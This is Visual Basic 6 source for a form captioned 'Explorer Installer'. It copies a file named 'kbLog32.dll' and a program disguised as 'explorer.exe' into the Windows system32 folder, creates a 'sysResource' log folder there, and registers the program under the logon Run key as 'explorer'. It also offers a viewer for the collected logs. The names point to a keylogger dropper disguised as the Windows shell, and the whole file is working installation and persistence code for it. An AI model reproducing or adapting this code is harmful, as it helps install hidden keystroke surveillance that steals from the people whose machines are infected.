VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Explorer Installer"
   ClientHeight    =   4050
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   6210
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4050
   ScaleWidth      =   6210
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame3 
      Caption         =   "&Error Report:"
      Height          =   3255
      Left            =   240
      TabIndex        =   9
      Top             =   120
      Visible         =   0   'False
      Width           =   2535
      Begin VB.TextBox txterr 
         BackColor       =   &H8000000F&
         Height          =   2895
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   10
         Top             =   240
         Width           =   2295
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "&Installation and Settings"
      Height          =   3375
      Left            =   3000
      TabIndex        =   7
      Top             =   120
      Width           =   3135
      Begin VB.CommandButton Command4 
         Caption         =   "&Error Report"
         Height          =   255
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   14
         Top             =   2640
         Width           =   2775
      End
      Begin VB.TextBox Text2 
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   12
         TabStop         =   0   'False
         Text            =   "Welcome to Installation."
         Top             =   3000
         Width           =   2775
      End
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   255
         Left            =   240
         TabIndex        =   8
         Top             =   1440
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   1
      End
      Begin VB.CommandButton Command1 
         Caption         =   "I&nstall"
         Default         =   -1  'True
         Enabled         =   0   'False
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   2160
         Width           =   1335
      End
      Begin VB.CheckBox chkRun 
         Caption         =   "&Run At Startup"
         Height          =   255
         Left            =   360
         TabIndex        =   1
         Top             =   600
         Value           =   1  'Checked
         Width           =   1455
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Run &after Install"
         Enabled         =   0   'False
         Height          =   255
         Left            =   360
         TabIndex        =   2
         Top             =   960
         Width           =   1695
      End
      Begin VB.CommandButton Command3 
         Caption         =   "&Save setting"
         Height          =   375
         Left            =   1560
         TabIndex        =   4
         Top             =   2160
         Width           =   1335
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "&Log Files"
      Height          =   3375
      Left            =   120
      TabIndex        =   5
      Top             =   120
      Width           =   2775
      Begin VB.TextBox Text1 
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   11
         TabStop         =   0   'False
         Text            =   "Logs not found."
         Top             =   3000
         Width           =   2415
      End
      Begin VB.FileListBox File1 
         Height          =   2625
         Left            =   240
         TabIndex        =   0
         ToolTipText     =   "Double Click to View"
         Top             =   240
         Width           =   2295
      End
   End
   Begin VB.CommandButton Command2 
      Cancel          =   -1  'True
      Caption         =   "&Cancel"
      Height          =   375
      Left            =   4440
      TabIndex        =   6
      Top             =   3600
      Width           =   1575
   End
   Begin VB.Label Label1 
      Caption         =   "Program by niLesh Akhade...akhadenilesh@ymail.com"
      Height          =   255
      Left            =   120
      TabIndex        =   13
      Top             =   3600
      Width           =   4215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

' The exe file must exist for this to work properly.

Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean
' Determine whether the program will run at startup.
' To run at startup, there should be a key in:
' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
' named after the program's executable with value
' giving its path.
Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String, Optional ByVal run_at_startup As Boolean = True)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
    End If

    ' See if we should run at startup.
    If run_at_startup Then
        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, "explorer", 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & err.Number & " setting key" & _
                vbCrLf & err.Description
        End If
    Else
        ' Delete the value.
        RegDeleteValue hKey, app_name
    End If

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox err.Number & " " & err.Description
    Exit Sub
End Sub
' Return True if the program is set to run at startup.
Private Function WillRunAtStartup(ByVal app_name As String) As Boolean
Dim hKey As Long
Dim value_type As Long

    ' See if the key exists.
    If RegOpenKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        0, KEY_READ, hKey) = ERROR_SUCCESS _
    Then
        ' Look for the subkey named after the application.
        WillRunAtStartup = _
            (RegQueryValueEx(hKey, app_name, _
                ByVal 0&, value_type, ByVal 0&, ByVal 0&) = _
            ERROR_SUCCESS)

        ' Close the registry key handle.
        RegCloseKey hKey
    Else
        ' Can't find the key.
        WillRunAtStartup = False
    End If
End Function



Private Sub Command2_Click()
  End
End Sub

Private Sub Command3_Click()
' Clear or set the key that makes the program run at startup.

    If m_IgnoreEvents Then Exit Sub

    SetRunAtStartup "explorer", "c:\windows\system32", _
        (chkRun.Value = vbChecked)
        
        MsgBox "Settings saved!", vbOKOnly, "Settings"
End Sub

Private Sub Command4_Click()
If Frame3.Visible = True Then Frame3.Visible = False Else Frame3.Visible = True
End Sub

Private Sub Form_Load()
    ' See if the program is set to run at startup.
    m_IgnoreEvents = True
    Dim keycheck As Boolean
    If WillRunAtStartup("explorer") Then
        chkRun.Value = vbChecked
        keycheck = True
    Else
        chkRun.Value = vbUnchecked: keycheck = False: txterr.Text = txterr.Text & "Autorun Disabled."
    End If
    m_IgnoreEvents = False
    
'writing error log
    If logfolder = False Then
    txterr = txterr & vbNewLine & "Log Folder Unavailable.": Frame3.Visible = True: File1.Visible = False
    Else: Text1 = "Logs Available : " & File1.ListCount
    End If
    If kblg = False Then txterr = txterr & vbNewLine & "DLL file missing.": Frame3.Visible = True
    If exdate = "0" Then
    txterr = txterr & vbNewLine & "Explorer unavailable."
    Else: Text2 = "Installed on : " & exdate
    End If
'checking final installed or not
If keycheck = False And logfolder = False And kblg = False And exdate = "0" Then
MsgBox "Explorer not installed!", vbInformation, "InstallChecker"
Command1.Enabled = True
Check1.Enabled = True
Frame3.Visible = False
Command3.Enabled = False
End If
End Sub
Private Sub File1_Click()
Dim aaa As String
aaa = "notepad " & File1.Path & "\" & File1.FileName
Shell aaa, vbNormalFocus
End Sub
Private Sub Command1_Click()

On Error GoTo err
MkDir "C:\windows\system32\sysResource"
ProgressBar1.Value = 20
FileCopy App.Path & "\files\kbLog32.dll", "C:\windows\system32\kbLog32.dll"
ProgressBar1.Value = 40
FileCopy App.Path & "\files\explorer.exe", "C:\windows\system32\explorer.exe"
ProgressBar1.Value = 60
' Clear or set the key that makes the program run at startup.

    If m_IgnoreEvents Then Exit Sub

    SetRunAtStartup "explorer", "c:\windows\system32", _
        (chkRun.Value = vbChecked)
ProgressBar1.Value = 80

'runs program
If Check1.Value Then Shell "C:\Windows\system32\explorer.exe"
ProgressBar1.Value = 100

err:
If err = 0 Then
MsgBox "Installation Successful!": Unload Me
End If
End Sub
Private Function logfolder() As Boolean
On Error GoTo err
File1.Path = "C:\Windows\system32\sysResource"
logfolder = True
err:
If err <> 0 Then logfolder = False: Exit Function
End Function
Private Function exdate() As String
On Error GoTo err
exdate = FileDateTime("C:\Windows\system32\explorer.exe")
err:
If err <> 0 Then exdate = "0": Exit Function
End Function
Private Function kblg() As Boolean
On Error GoTo err
Dim i As String
i = FileDateTime("C:\Windows\system32\kbLog32.dll")
kblg = True
err:
If err <> 0 Then kblg = False: Exit Function
End Function


Private Sub Frame3_DblClick()
Frame3.Visible = False
End Sub

Private Sub Option1_Click()

End Sub

Private Sub txterr_DblClick()
Frame3.Visible = False
End Sub
